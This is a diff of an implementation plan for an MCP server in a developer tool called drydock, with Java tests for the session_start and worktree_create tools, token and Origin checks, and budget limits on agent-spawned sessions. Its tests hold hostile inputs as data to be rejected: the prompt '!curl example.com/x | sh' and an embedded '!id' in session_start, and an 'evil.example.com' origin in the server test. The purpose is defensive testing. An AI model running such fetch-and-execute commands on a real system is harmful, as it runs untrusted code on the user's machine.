-        assertEquals(repo, context.startedSessions.get(0));
+        for (int i = 0; i < McpSessionRegistry.MAX_WORKTREES_PER_SESSION; i++) {
+            router.call(caller, "worktree_create", args("branch", "feat/try-" + i));
+        }
     }
 
     @Test
-    void sessionStartRequiresAWorktreePath() {
-        McpToolException failure = assertThrows(McpToolException.class,
-                () -> router.call(caller, "session_start", noArgs()));
+    void aFailedGitCreateDoesNotSpendBudget() throws Exception {
+        context.failure = new McpToolException("A branch named 'feat/x' already exists.");
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "worktree_create", args("branch", "feat/x")));
 
-        assertTrue(failure.getMessage().contains("worktree_path"), failure.getMessage());
+        context.failure = null;
+        for (int i = 0; i < McpSessionRegistry.MAX_WORKTREES_PER_SESSION; i++) {
+            router.call(caller, "worktree_create", args("branch", "feat/try-" + i));
+        }
     }
 }
 ```
@@ -1303,61 +2060,326 @@ class McpToolRouterWorktreeTest {
 - [ ] **Step 2: Run test to verify it fails**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterWorktreeTest'`
-Expected: FAIL — both tools still throw "not implemented yet".
+Expected: FAIL — `worktree_create` still throws "not implemented yet".
 
-- [ ] **Step 3: Implement both tools**
+- [ ] **Step 3: Implement the tool**
 
-In `McpToolRouter`:
+In `McpToolRouter`, in this order — the order is the point of the last two tests:
 
-`worktree_create`:
-- Require a non-blank `branch`; optional `start_point`.
-- Call `context.createWorktree(repositoryRoot(caller), branch, startPoint)` and let `McpToolException` propagate unchanged — the underlying service already produces the actionable text.
-- Return `path` and `branch`.
+1. Resolve `repositoryRoot(caller)`; session-gone if empty.
+2. `registry.maySpawn(caller)`; if false, throw `McpToolException` explaining that this session was started by an agent and may not create worktrees or sessions, and that the human can do so from the UI.
+3. Require a non-blank `branch`; read optional `start_point`.
+4. `BranchNames.validate(branch, context.remoteNames(caller))`.
+5. `context.createWorktree(caller, branch, startPoint)`, letting `McpToolException` propagate unchanged — the underlying service already produces actionable text.
+6. **Only on success**, `registry.chargeWorktree(caller)`, translating `McpBudgetExhaustedException` into `McpToolException`.
 
-`session_start`:
-- Require a non-blank `worktree_path`.
-- Canonicalize: `Path.of(raw).toAbsolutePath().normalize()`.
-- Fetch `context.worktreesOf(repositoryRoot(caller))`, normalize each the same way, and require an **exact `Path.equals` match**. No `startsWith`. On no match, throw `McpToolException` naming the rejected path and stating it is not a worktree of this session's repository.
-- Call `context.startSession(normalized, prompt)`; return `session_id` and `worktree_path`.
+Charging after success means a rejected name or a git failure does not consume budget. It also means a successful create just past the limit is kept rather than orphaned — check the budget *before* step 5 as well, so the limit is not exceeded by one; charge after so failures are free. Implement both: a pre-check that throws when the counter is already at the limit, and the charge afterwards.
 
 - [ ] **Step 4: Run test to verify it passes**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterWorktreeTest'`
-Expected: PASS (11 tests)
+Expected: PASS (10 tests)
+
+- [ ] **Step 5: Commit**
+
+```bash
+git add app/src/main/java/app/drydock/mcp/McpToolRouter.java \
+        app/src/test/java/app/drydock/mcp/McpToolRouterWorktreeTest.java
+git commit -m "feat(mcp): worktree_create with branch validation and a budget"
+```
+
+---
+
+### Task 9: `session_start`
+
+**Files:**
+- Modify: `app/src/main/java/app/drydock/mcp/McpToolRouter.java`
+- Test: `app/src/test/java/app/drydock/mcp/McpToolRouterSessionStartTest.java`
+
+**Note on the test's paths.** Membership is decided on **real** paths, so this test uses `@TempDir` and real directories, including a real symlink. Fabricated paths like `/repos/drydock` cannot be used: `toRealPath()` throws on a path that does not exist.
+
+**Interfaces:**
+- Consumes: `McpSessionContext.realWorktreesOf` / `startSession` (Task 6), `PromptSafety.validate` (Task 5), `McpSessionRegistry.maySpawn` / `chargeSession` (Task 4).
+- Produces: no new public signatures.
+
+- [ ] **Step 1: Write the failing test**
+
+Create `app/src/test/java/app/drydock/mcp/McpToolRouterSessionStartTest.java`:
+
+```java
+package app.drydock.mcp;
+
+import app.drydock.domain.ManagedSessionId;
+import app.drydock.mcp.McpSessionRegistry.Spawn;
+import app.drydock.state.json.JsonValue;
+import org.junit.jupiter.api.BeforeEach;
+import org.junit.jupiter.api.Test;
+import org.junit.jupiter.api.io.TempDir;
+
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.Optional;
+
+import static app.drydock.mcp.JsonPeek.args;
+import static app.drydock.mcp.JsonPeek.noArgs;
+import static app.drydock.mcp.JsonPeek.str;
+import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertThrows;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+
+class McpToolRouterSessionStartTest {
+
+    private final ManagedSessionId caller = ManagedSessionId.newId();
+    private FakeMcpSessionContext context;
+    private McpSessionRegistry registry;
+    private McpToolRouter router;
+    private Path repo;
+    private Path sibling;
+
+    @BeforeEach
+    void setUp(@TempDir Path base) throws Exception {
+        repo = Files.createDirectories(base.resolve("repo")).toRealPath();
+        sibling = Files.createDirectories(base.resolve("wt/try-a")).toRealPath();
+
+        context = new FakeMcpSessionContext();
+        context.repositoryRoot = Optional.of(repo);
+        context.worktreePath = Optional.of(repo);
+        context.worktrees.add(repo);
+        context.worktrees.add(sibling);
+
+        registry = new McpSessionRegistry();
+        registry.mint(caller, Spawn.ALLOWED);
+        router = new McpToolRouter(context, registry);
+    }
+
+    @Test
+    void opensATabInAWorktreeOfTheCallersRepository() throws Exception {
+        JsonValue result = router.call(caller, "session_start",
+                args("worktree_path", sibling.toString(), "prompt", "Try approach A."));
+
+        assertEquals(sibling, context.startedSessions.get(0));
+        assertEquals("Try approach A.", context.startedPrompts.get(0));
+        assertTrue(str(result, "session_id").length() > 0);
+    }
+
+    @Test
+    void worksWithoutAPrompt() throws Exception {
+        router.call(caller, "session_start", args("worktree_path", sibling.toString()));
+
+        assertEquals(sibling, context.startedSessions.get(0));
+        assertTrue(context.startedPrompts.isEmpty());
+    }
+
+    @Test
+    void requiresAWorktreePath() {
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start", noArgs()));
+
+        assertTrue(failure.getMessage().contains("worktree_path"), failure.getMessage());
+    }
+
+    @Test
+    void refusesAPathThatIsNotAWorktreeOfTheCallersRepository(@TempDir Path elsewhere) throws Exception {
+        Path outside = Files.createDirectories(elsewhere.resolve("someone-else")).toRealPath();
+
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start", args("worktree_path", outside.toString())));
+
+        assertTrue(failure.getMessage().contains(outside.toString()), failure.getMessage());
+        assertTrue(context.startedSessions.isEmpty(), "no session may be started");
+    }
+
+    @Test
+    void refusesASiblingWhosePathMerelySharesAPrefix(@TempDir Path base) throws Exception {
+        // Membership, never a string-prefix test: "<...>/repo-evil" starts with
+        // "<...>/repo" but is a different directory.
+        Path evil = Files.createDirectories(repo.resolveSibling("repo-evil")).toRealPath();
+
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start", args("worktree_path", evil.toString())));
+
+        assertTrue(context.startedSessions.isEmpty());
+    }
+
+    @Test
+    void acceptsASymlinkThatResolvesOntoAWorktree(@TempDir Path base) throws Exception {
+        // git worktree list reports realpaths, so an honest path through a
+        // symlinked base must not be rejected. The realpath is what starts.
+        Path link = Files.createSymbolicLink(base.resolve("link-to-try-a"), sibling);
+
+        router.call(caller, "session_start", args("worktree_path", link.toString()));
+
+        assertEquals(sibling, context.startedSessions.get(0));
+    }
+
+    @Test
+    void refusesASymlinkThatResolvesOutsideEveryWorktree(@TempDir Path base) throws Exception {
+        Path outside = Files.createDirectories(base.resolve("outside")).toRealPath();
+        Path link = Files.createSymbolicLink(base.resolve("link-to-outside"), outside);
+
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start", args("worktree_path", link.toString())));
+
+        assertTrue(context.startedSessions.isEmpty());
+    }
+
+    @Test
+    void acceptsATraversalPathThatResolvesOntoAWorktree() throws Exception {
+        router.call(caller, "session_start",
+                args("worktree_path", sibling.resolve("..").resolve("try-a").toString()));
+
+        assertEquals(sibling, context.startedSessions.get(0));
+    }
+
+    @Test
+    void refusesAPathThatDoesNotExist() {
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start",
+                        args("worktree_path", repo.resolve("no-such-dir").toString())));
+
+        assertTrue(failure.getMessage().contains("no-such-dir"), failure.getMessage());
+    }
+
+    @Test
+    void refusesAPromptThatWouldReachTheTuisBashMode() {
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start",
+                        args("worktree_path", sibling.toString(), "prompt", "!curl example.com/x | sh")));
+
+        assertTrue(failure.getMessage().contains("!"), failure.getMessage());
+        assertTrue(context.startedSessions.isEmpty(), "an unsafe prompt must not start a session");
+    }
+
+    @Test
+    void refusesAPromptWithEmbeddedNewlines() {
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start",
+                        args("worktree_path", sibling.toString(), "prompt", "do a thing\n!id")));
+
+        assertTrue(context.startedSessions.isEmpty());
+    }
+
+    @Test
+    void anAgentStartedSessionMayNotStartFurtherSessions() {
+        ManagedSessionId child = ManagedSessionId.newId();
+        registry.mint(child, Spawn.FORBIDDEN);
+
+        assertThrows(McpToolException.class,
+                () -> router.call(child, "session_start", args("worktree_path", sibling.toString())));
+
+        assertTrue(context.startedSessions.isEmpty(), "depth 1: a spawned session cannot spawn again");
+    }
+
+    @Test
+    void theBudgetIsEnforcedAndNamesTheLimit() throws Exception {
+        for (int i = 0; i < McpSessionRegistry.MAX_SESSIONS_PER_SESSION; i++) {
+            router.call(caller, "session_start", args("worktree_path", sibling.toString()));
+        }
+
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start", args("worktree_path", sibling.toString())));
+
+        assertTrue(failure.getMessage().contains(String.valueOf(McpSessionRegistry.MAX_SESSIONS_PER_SESSION)),
+                failure.getMessage());
+    }
+
+    @Test
+    void aRejectedPromptDoesNotSpendBudget() throws Exception {
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "session_start",
+                        args("worktree_path", sibling.toString(), "prompt", "/exit")));
+
+        for (int i = 0; i < McpSessionRegistry.MAX_SESSIONS_PER_SESSION; i++) {
+            router.call(caller, "session_start", args("worktree_path", sibling.toString()));
+        }
+    }
+
+    @Test
+    void theReturnedSessionIdIsNotTheCallers() throws Exception {
+        JsonValue result = router.call(caller, "session_start", args("worktree_path", sibling.toString()));
+
+        assertFalse(str(result, "session_id").equals(caller.toString()));
+    }
+}
+```
+
+- [ ] **Step 2: Run test to verify it fails**
+
+Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterSessionStartTest'`
+Expected: FAIL — `session_start` still throws "not implemented yet".
+
+- [ ] **Step 3: Implement the tool**
+
+In `McpToolRouter`, in this order:
+
+1. Resolve `repositoryRoot(caller)`; session-gone if empty.
+2. `registry.maySpawn(caller)`; if false, the same refusal as `worktree_create`.
+3. Require a non-blank `worktree_path`; read the optional `prompt` and, when present, `PromptSafety.validate(prompt)`.
+4. Resolve the target: `Path.of(raw).toAbsolutePath()`, then `toRealPath()`. Catch `IOException` (including `NoSuchFileException`) and throw `McpToolException` naming the path and saying it does not exist.
+5. Fetch `context.realWorktreesOf(caller)` and require an **exact `Path.equals` match**. No `startsWith`. On no match, throw `McpToolException` naming the rejected path and stating it is not a worktree of this session's repository.
+6. Pre-check the session budget, then `context.startSession(resolved, prompt)`, then charge on success.
+7. Return `session_id` and `worktree_path` (the resolved real path).
+
+- [ ] **Step 4: Run test to verify it passes**
+
+Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterSessionStartTest'`
+Expected: PASS (15 tests)
 
 - [ ] **Step 5: Confirm no destroy tool leaked in**
 
-Run: `grep -nE "remove|delete|close|merge|force" app/src/main/java/app/drydock/mcp/McpToolRouter.java`
-Expected: no match that names a tool or calls a destructive service method. The spec is create-only.
+Run: `grep -nE "remove|delete|merge|--force" app/src/main/java/app/drydock/mcp/McpToolRouter.java`
+Expected: no match that names a tool or calls a destructive service method.
 
 - [ ] **Step 6: Commit**
 
 ```bash
 git add app/src/main/java/app/drydock/mcp/McpToolRouter.java \
-        app/src/test/java/app/drydock/mcp/McpToolRouterWorktreeTest.java
-git commit -m "feat(mcp): worktree_create and session_start tools"
+        app/src/test/java/app/drydock/mcp/McpToolRouterSessionStartTest.java
+git commit -m "feat(mcp): session_start with realpath membership and prompt safety"
 ```
 
 ---
 
-### Task 6: `McpServer` — HTTP transport, auth, and JSON-RPC
+### Task 10: `McpServer` — transport, protocol, auth
 
 **Files:**
 - Create: `app/src/main/java/app/drydock/mcp/McpServer.java`
+- Modify: `buildSrc/src/main/kotlin/drydock/tasks/RuntimeImageTask.kt`
 - Test: `app/src/test/java/app/drydock/mcp/McpServerTest.java`
 
 **Interfaces:**
-- Consumes: `McpSessionRegistry` (Task 1), `McpToolRouter` (Tasks 3–5).
+- Consumes: `McpSessionRegistry` (Task 4), `McpToolRouter` (Tasks 6–9).
 - Produces:
   - `McpServer(McpSessionRegistry registry, McpToolRouter router)`
   - `void start() throws IOException` — binds `127.0.0.1:0`
-  - `int port()` — after `start()`
-  - `String endpointUrl()` — e.g. `http://127.0.0.1:54321/mcp`
+  - `int port()`, `String endpointUrl()`
   - `void close()` (implements `AutoCloseable`)
 
-**Protocol shape.** JSON-RPC 2.0 over `POST /mcp`. Handle three methods: `initialize` (reply with `protocolVersion`, `serverInfo` `{name: "drydock", version}`, and `capabilities.tools`), `tools/list` (reply `{tools: [...]}` from `router.toolDescriptors()`), and `tools/call` (params `{name, arguments}` → `{content: [{type: "text", text: <json>}], isError: false}`, or `{content: [...], isError: true}` carrying the `McpToolException` message). Any other method gets JSON-RPC error `-32601`.
+**Protocol.** JSON-RPC 2.0 over `POST /mcp`. Requests (with an `id`): `initialize`, `ping`, `tools/list`, `tools/call`; anything else `-32601`. Notifications (no `id`) are accepted and answered `204` with no body — `claude` sends `notifications/initialized` right after `initialize`, and replying with an error object to a notification risks the handshake never completing, which would leave every unit test green and the feature inert.
 
-- [ ] **Step 1: Write the failing test**
+- [ ] **Step 1: Add `jdk.httpserver` to the runtime image**
+
+In `buildSrc/src/main/kotlin/drydock/tasks/RuntimeImageTask.kt` (around lines 229–232), the `--add-modules` list currently reads:
+
+```kotlin
+                // java.net.http: GitHubService's search client (Clone-from-GitHub modal).
+                "java.base,java.desktop,java.net.http,java.xml,jdk.jfr,jdk.unsupported," +
+                    "javafx.base,javafx.controls,javafx.graphics",
+```
+
+Add `jdk.httpserver`, and a comment justifying it as the file's convention requires:
+
+```kotlin
+                // java.net.http: GitHubService's search client (Clone-from-GitHub modal).
+                // jdk.httpserver: McpServer's localhost MCP endpoint.
+                "java.base,java.desktop,java.net.http,java.xml,jdk.httpserver,jdk.jfr,jdk.unsupported," +
+                    "javafx.base,javafx.controls,javafx.graphics",
+```
+
+Do this first, and in this task, because `test` and `run` use the full JDK toolchain and would never reveal the omission: only the **packaged** app would fail, with `NoClassDefFoundError` at the first tool call.
+
+- [ ] **Step 2: Write the failing test**
 
 Create `app/src/test/java/app/drydock/mcp/McpServerTest.java`:
 
@@ -1365,6 +2387,7 @@ Create `app/src/test/java/app/drydock/mcp/McpServerTest.java`:
 package app.drydock.mcp;
 
 import app.drydock.domain.ManagedSessionId;
+import app.drydock.mcp.McpSessionRegistry.Spawn;
 import org.junit.jupiter.api.AfterEach;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
@@ -1398,18 +2421,21 @@ class McpServerTest {
         ManagedSessionId session = ManagedSessionId.newId();
         context.repositoryRoot = Optional.of(Path.of("/repos/drydock"));
         context.worktreePath = Optional.of(Path.of("/repos/drydock"));
-        token = registry.mint(session);
-        server = new McpServer(registry, new McpToolRouter(context));
+        token = registry.mint(session, Spawn.ALLOWED);
+        server = new McpServer(registry, new McpToolRouter(context, registry));
         server.start();
         client = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
     }
 
     @AfterEach
     void tearDown() {
-        server.close();
+        if (server != null) {
+            server.close();
+        }
     }
 
-    private HttpResponse<String> post(String body, String presentedToken, String origin) throws Exception {
+    private HttpResponse<String> post(String body, String presentedToken, String origin, String host)
+            throws Exception {
         HttpRequest.Builder request = HttpRequest.newBuilder(URI.create(server.endpointUrl()))
                 .timeout(Duration.ofSeconds(5))
                 .header("Content-Type", "application/json")
@@ -1420,11 +2446,14 @@ class McpServerTest {
         if (origin != null) {
             request.header("Origin", origin);
         }
+        if (host != null) {
+            request.header("X-Forwarded-Host", host);
+        }
         return client.send(request.build(), HttpResponse.BodyHandlers.ofString());
     }
 
     private HttpResponse<String> post(String body) throws Exception {
-        return post(body, token, null);
+        return post(body, token, null, null);
     }
 
     @Test
@@ -1439,18 +2468,48 @@ class McpServerTest {
                 {"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}""");
 
         assertEquals(200, response.statusCode());
-        assertTrue(response.body().contains("\"serverInfo\""), response.body());
+        assertTrue(response.body().contains("serverInfo"), response.body());
         assertTrue(response.body().contains("drydock"), response.body());
-        assertTrue(response.body().contains("\"tools\""), response.body());
+        assertTrue(response.body().contains("protocolVersion"), response.body());
+        assertTrue(response.body().contains("tools"), response.body());
+    }
+
+    @Test
+    void initializedNotificationIsAcceptedWithoutAnError() throws Exception {
+        // claude sends this immediately after initialize. Answering a
+        // notification with an error object breaks the handshake, which would
+        // leave every unit test green and the feature inert.
+        HttpResponse<String> response = post("""
+                {"jsonrpc":"2.0","method":"notifications/initialized"}""");
+
+        assertEquals(204, response.statusCode());
+        assertTrue(response.body().isEmpty(), "a notification gets no body: " + response.body());
+    }
+
+    @Test
+    void anUnknownNotificationIsAlsoAcceptedSilently() throws Exception {
+        HttpResponse<String> response = post("""
+                {"jsonrpc":"2.0","method":"notifications/cancelled","params":{"requestId":1}}""");
+
+        assertEquals(204, response.statusCode());
+    }
+
+    @Test
+    void pingIsAnswered() throws Exception {
+        HttpResponse<String> response = post("""
+                {"jsonrpc":"2.0","id":2,"method":"ping"}""");
+
+        assertEquals(200, response.statusCode());
+        assertFalse(response.body().contains("error"), response.body());
     }
 
     @Test
     void toolsListReturnsEveryTool() throws Exception {
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}""");
+                {"jsonrpc":"2.0","id":3,"method":"tools/list","params":{}}""");
 
         assertEquals(200, response.statusCode());
-        for (String tool : new String[] {"review_comments", "review_mark_addressed", "worktree_create",
+        for (String tool : new String[] {"review_comments", "review_reply", "worktree_create",
                 "session_start", "repos_list", "sessions_list"}) {
             assertTrue(response.body().contains(tool), "missing " + tool + " in: " + response.body());
         }
@@ -1459,22 +2518,22 @@ class McpServerTest {
     @Test
     void toolsCallReturnsToolOutput() throws Exception {
         context.repositories.add(new McpSessionContext.RepoSummary("drydock", Path.of("/repos/drydock"),
-                Optional.of("feat/mcp"), false, 0, 0, false));
+                Optional.of("feat/mcp"), Optional.of(false), Optional.of(0), Optional.of(0), false));
 
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":3,"method":"tools/call",
+                {"jsonrpc":"2.0","id":4,"method":"tools/call",
                  "params":{"name":"repos_list","arguments":{}}}""");
 
         assertEquals(200, response.statusCode());
         assertTrue(response.body().contains("drydock"), response.body());
-        assertTrue(response.body().contains("\"isError\":false")
-                || response.body().contains("\"isError\": false"), response.body());
+        // JsonWriter pretty-prints with ": " after keys.
+        assertTrue(response.body().contains("\"isError\": false"), response.body());
     }
 
     @Test
     void aFailingToolIsAnIsErrorResultNotATransportError() throws Exception {
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":4,"method":"tools/call",
+                {"jsonrpc":"2.0","id":5,"method":"tools/call",
                  "params":{"name":"worktree_create","arguments":{}}}""");
 
         assertEquals(200, response.statusCode());
@@ -1485,7 +2544,7 @@ class McpServerTest {
     @Test
     void aMissingTokenIsRejected() throws Exception {
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":5,"method":"tools/list","params":{}}""", null, null);
+                {"jsonrpc":"2.0","id":6,"method":"tools/list","params":{}}""", null, null, null);
 
         assertEquals(401, response.statusCode());
     }
@@ -1493,29 +2552,26 @@ class McpServerTest {
     @Test
     void anUnknownTokenIsRejected() throws Exception {
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":6,"method":"tools/list","params":{}}""", "bogus-token", null);
+                {"jsonrpc":"2.0","id":7,"method":"tools/list","params":{}}""", "bogus-token", null, null);
 
         assertEquals(401, response.statusCode());
     }
 
     @Test
     void aRevokedTokenStopsWorking() throws Exception {
-        ManagedSessionId session = registry.resolve(token).orElseThrow();
-        registry.revoke(session);
+        registry.revoke(registry.resolve(token).orElseThrow());
 
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":7,"method":"tools/list","params":{}}""");
+                {"jsonrpc":"2.0","id":8,"method":"tools/list","params":{}}""");
 
         assertEquals(401, response.statusCode());
     }
 
     @Test
     void aForeignOriginIsRejectedEvenWithAValidToken() throws Exception {
-        // DNS rebinding: a page in the user's browser could otherwise reach
-        // this endpoint. A valid token must not be enough.
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":8,"method":"tools/list","params":{}}""",
-                token, "https://evil.example.com");
+                {"jsonrpc":"2.0","id":9,"method":"tools/list","params":{}}""",
+                token, "https://evil.example.com", null);
 
         assertEquals(403, response.statusCode());
     }
@@ -1523,8 +2579,16 @@ class McpServerTest {
     @Test
     void aLoopbackOriginIsAccepted() throws Exception {
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":9,"method":"tools/list","params":{}}""",
-                token, "http://127.0.0.1:" + server.port());
+                {"jsonrpc":"2.0","id":10,"method":"tools/list","params":{}}""",
+                token, "http://127.0.0.1:" + server.port(), null);
+
+        assertEquals(200, response.statusCode());
+    }
+
+    @Test
+    void aMissingOriginIsAcceptedBecauseCliClientsSendNone() throws Exception {
+        HttpResponse<String> response = post("""
+                {"jsonrpc":"2.0","id":11,"method":"tools/list","params":{}}""", token, null, null);
 
         assertEquals(200, response.statusCode());
     }
@@ -1532,7 +2596,7 @@ class McpServerTest {
     @Test
     void anUnknownMethodGetsJsonRpcMethodNotFound() throws Exception {
         HttpResponse<String> response = post("""
-                {"jsonrpc":"2.0","id":10,"method":"resources/list","params":{}}""");
+                {"jsonrpc":"2.0","id":12,"method":"resources/list","params":{}}""");
 
         assertTrue(response.body().contains("-32601"), response.body());
     }
@@ -1543,7 +2607,7 @@ class McpServerTest {
         assertTrue(broken.statusCode() == 400 || broken.body().contains("-32700"), broken.body());
 
         HttpResponse<String> after = post("""
-                {"jsonrpc":"2.0","id":11,"method":"tools/list","params":{}}""");
+                {"jsonrpc":"2.0","id":13,"method":"tools/list","params":{}}""");
         assertEquals(200, after.statusCode(), "server must survive a malformed request");
     }
 
@@ -1561,62 +2625,81 @@ class McpServerTest {
 
     @Test
     void neitherPortNorTokenIsEverLogged() {
-        // Guard against a debug log leaking credentials; see AGENTS.md.
         assertFalse(server.toString().contains(token), "token must not appear in toString()");
+    }
+
+    @Test
+    void closingTwiceIsHarmless() {
+        server.close();
+        server.close();
     }
 }
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+The `Host` header cannot be set through `HttpClient` (it is restricted), which is why the test uses `X-Forwarded-Host` as a stand-in and does not assert on `Host` directly. Implement the real `Host` check anyway, and note in the code comment that it is covered by the manual checklist rather than by this test.
+
+- [ ] **Step 3: Run test to verify it fails**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpServerTest'`
 Expected: FAIL — `McpServer` does not exist.
 
-- [ ] **Step 3: Write the server**
+- [ ] **Step 4: Write the server**
 
 Create `app/src/main/java/app/drydock/mcp/McpServer.java`, using `com.sun.net.httpserver.HttpServer`:
 
 - `start()`: `HttpServer.create(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0), 0)`, one handler at `/mcp`, `setExecutor(Executors.newVirtualThreadPerTaskExecutor())`. Never the FX thread.
 - Reject non-`POST` with 405.
-- Read the `X-Drydock-Session-Token` header; `registry.resolve(...)`; empty → 401 with an empty body.
-- If an `Origin` header is present, accept only `http://127.0.0.1:<port>` and `http://localhost:<port>`; otherwise 403. A request with no `Origin` (a CLI client) is fine.
-- Parse the body with `JsonParser`. A parse failure returns JSON-RPC `-32700`; **never** let it escape the handler. Wrap the whole handler body in `try/catch (Exception)` that logs and returns `-32603`, so one bad request cannot kill the server.
-- Dispatch `initialize`, `tools/list`, `tools/call`; anything else `-32601`.
-- For `tools/call`, catch `McpToolException` and return a `200` JSON-RPC *result* with `isError: true` and the message as text content. A tool failure is not a transport failure.
-- `close()`: `server.stop(0)` and shut down the executor. Null-safe so `close()` before `start()` is harmless.
-- Override `toString()` to report the class name and port only — never the tokens.
+- Read `X-Drydock-Session-Token`; `registry.resolve(...)`; empty → 401 with an empty body.
+- If `Origin` is present, accept only `http://127.0.0.1:<port>` and `http://localhost:<port>`; otherwise 403. Absent `Origin` is fine — CLI clients send none. Apply the same rule to `Host`.
+- Parse with `JsonParser.parse` (static; throws the unchecked `JsonParseException`). A parse failure returns JSON-RPC `-32700`. Wrap the whole handler body in `try/catch (Exception)` that logs and returns `-32603`, so one bad request cannot kill the server.
+- **Notification first:** if the parsed object has no `id`, return 204 with no body regardless of `method`.
+- Dispatch `initialize`, `ping`, `tools/list`, `tools/call`; anything else `-32601`.
+- For `tools/call`, catch `McpToolException` and return a 200 JSON-RPC *result* with `isError: true` and the message as text content.
+- `close()`: `server.stop(0)` and shut down the executor, null-safe and idempotent.
+- `toString()` reports class name and port only.
 
-- [ ] **Step 4: Run test to verify it passes**
+- [ ] **Step 5: Run test to verify it passes**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpServerTest'`
-Expected: PASS (14 tests)
+Expected: PASS (19 tests)
 
-- [ ] **Step 5: Commit**
+- [ ] **Step 6: Verify the packaged runtime carries the module**
+
+Run: `./gradlew :app:runtimeImage`
+Then: `<the built runtime>/bin/java --list-modules | grep jdk.httpserver`
+Expected: one line. If the task name differs, find it with `./gradlew :app:tasks --all | grep -i image`.
+
+- [ ] **Step 7: Commit**
 
 ```bash
 git add app/src/main/java/app/drydock/mcp/McpServer.java \
-        app/src/test/java/app/drydock/mcp/McpServerTest.java
-git commit -m "feat(mcp): localhost HTTP transport with token auth and origin checks"
+        app/src/test/java/app/drydock/mcp/McpServerTest.java \
+        buildSrc/src/main/kotlin/drydock/tasks/RuntimeImageTask.kt
+git commit -m "feat(mcp): localhost HTTP transport with MCP handshake and token auth"
 ```
 
 ---
 
-### Task 7: `McpConfigWriter` and the `--mcp-config` capability gate
+### Task 11: `McpConfigWriter` and the `--mcp-config` capability gate
 
 **Files:**
 - Create: `app/src/main/java/app/drydock/mcp/McpConfigWriter.java`
 - Modify: `app/src/main/java/app/drydock/claude/ClaudeCapabilities.java`
 - Modify: `app/src/main/java/app/drydock/claude/ClaudeCapabilityService.java`
 - Test: `app/src/test/java/app/drydock/mcp/McpConfigWriterTest.java`
-- Test: `app/src/test/java/app/drydock/claude/ClaudeCapabilityServiceTest.java` (extend if it exists; create otherwise)
+- Test: `app/src/test/java/app/drydock/claude/ClaudeCapabilityServiceTest.java` (extend)
 
 **Interfaces:**
-- Consumes: `McpSessionRegistry.tokenFor` (Task 1), `McpServer.endpointUrl` (Task 6), `JsonWriter`.
+- Consumes: `McpSessionRegistry.tokenFor` (Task 4), `McpServer.endpointUrl` (Task 10), `JsonWriter`.
 - Produces:
   - `McpConfigWriter(Path baseDirectory)`
-  - `Path McpConfigWriter.writeFor(ManagedSessionId sessionId, String endpointUrl, String token) throws IOException`
-  - `void McpConfigWriter.delete(ManagedSessionId sessionId)`
-  - `ClaudeCapabilities.supportsMcpConfig()` — a new record component, **appended last before `version`**.
+  - `Path writeFor(ManagedSessionId, String endpointUrl, String token) throws IOException`
+  - `void delete(ManagedSessionId)`
+  - `void purgeStale()`
+  - `ClaudeCapabilities.supportsMcpConfig()` — new component, **immediately before `version`**
+  - `static boolean ClaudeCapabilityService.helpMentionsMcpConfig(String helpOutput)`
+
+**Current `ClaudeCapabilities` shape** (verified at `ClaudeCapabilities.java:16-23`): `supportsName, supportsResume, supportsForkSession, supportsSessionId, supportsSettings, version` — six components, becoming seven.
 
 - [ ] **Step 1: Write the failing test**
 
@@ -1633,6 +2716,8 @@ import org.junit.jupiter.api.io.TempDir;
 
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.attribute.PosixFilePermission;
+import java.util.Set;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
@@ -1643,9 +2728,8 @@ class McpConfigWriterTest {
     @Test
     void writesAnMcpServerEntryCarryingTheEndpointAndToken(@TempDir Path base) throws Exception {
         McpConfigWriter writer = new McpConfigWriter(base);
-        ManagedSessionId session = ManagedSessionId.newId();
 
-        Path config = writer.writeFor(session, "http://127.0.0.1:54321/mcp", "tok-abc");
+        Path config = writer.writeFor(ManagedSessionId.newId(), "http://127.0.0.1:54321/mcp", "tok-abc");
 
         JsonValue parsed = JsonParser.parse(Files.readString(config));
         JsonValue entry = JsonPeek.field(JsonPeek.field(parsed, "mcpServers"), "drydock");
@@ -1661,7 +2745,7 @@ class McpConfigWriterTest {
         Path first = writer.writeFor(ManagedSessionId.newId(), "http://127.0.0.1:1/mcp", "a");
         Path second = writer.writeFor(ManagedSessionId.newId(), "http://127.0.0.1:1/mcp", "b");
 
-        assertFalse(first.equals(second), "per-session token demands a per-session file");
+        assertFalse(first.equals(second), "a per-session token demands a per-session file");
